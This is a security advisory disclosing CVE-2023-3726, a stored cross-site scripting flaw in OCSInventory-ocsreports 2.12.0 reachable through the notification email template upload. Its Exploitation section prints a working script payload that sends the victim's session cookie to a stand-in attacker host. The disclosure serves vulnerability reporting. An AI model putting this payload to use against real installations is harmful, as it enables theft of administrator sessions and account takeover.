---
slug: advisories/creed/
title: OCSInventory-ocsreports 2.12.0 - Stored cross-site Scripting
authors: Ronald Hernandez
writer: rhernandez
codename: creed
product:  OCSInventory-ocsreports2.12.0 - Stored cross-site Scripting
date: 2023-07-17 12:00 COT
cveid: CVE-2023-3726
severity: 4.9
description: OCSInventory-ocsreports2.12.0 - Stored cross-site Scripting
keywords: Fluid Attacks, Security, Vulnerabilities, Xss, Csrf, Ocs Inventory, Ocs Reports
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                |
| --------------------- | ---------------------------------------------------------------|
| **Name**              | OCSInventory-ocsreports 2.12.0 - Stored cross-site Scripting   |
| **Code name**         | [Creed](https://en.wikipedia.org/wiki/Creed_(band))            |
| **Product**           | OCSInventory                                                   |
| **Affected versions** | Version 2.12.0                                                 |
| **State**             | Private                                                        |
| **Release date**      | 2023-07-17                                                     |

## Vulnerability

|                         |                                                                                                |
| ----------------------- | -----------------------------------------------------------------------------------------------|
| **Kind**                | Stored cross-site Scripting                                                                    |
| **Rule**                | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/010)  |
| **Remote**              | Yes                                                                                            |
| **CVSSv3.1 Vector**     | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N                                                   |
| **CVSSv3.1 Base Score** | 4.9                                                                                            |
| **Exploit available**   | Yes                                                                                            |
| **CVE ID(s)**           | [CVE-2023-3726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3726)                  |

## Description

OCSInventory allow stored email template with special
characteres that lead to a Stored cross-site Scripting.

## Vulnerability

A cross-site scripting (XSS) vulnerability has been identified
in OCSInventory-ocsreports, which could potentially allow an
attacker to steal sensitive data such as session cookies.
It is also possible to steal the password hash if the attacker
changes the server state to debug, this due to the server in
debug mode displaying the hash.This could be exploited if
the target is an administrator with a current login session.

## Exploitation

To exploit this vulnerability we need to go to  the Portal of
ocsreports -> Configuration -> Notification -> Customize
Template and Upload a HTML file with our payload:

![1](https://user-images.githubusercontent.com/87587286/254076644-2b47f9c3-d9b4-46fb-8110-a24fd8672541.png)

![2](https://user-images.githubusercontent.com/87587286/254074275-fee41556-a83e-43c7-aedc-35bc9c7acb81.png)

```html
<script>
new Image().src="http://ourattacker-pc.com/?cookie="+document.cookie;
</script>
```

Note that only administrators can make changes to the mail template.

## Evidence of exploitation

![poc](https://user-images.githubusercontent.com/87587286/254074571-db7d5cd7-a661-4873-8850-5fbe2f8d82fc.gif)

## Our security policy

We have reserved the ID CVE-2023-3726 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: OCSInventory-ocsreports v2.12.0

* Operating System: Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by
[Ronald Hernandez](https://www.linkedin.com/in/ronald91)
from Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://ocsinventory-ng.org/>

## Timeline

<time-lapse
  discovered="2023-07-17"
  contacted="2023-07-17"
  replied=""
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>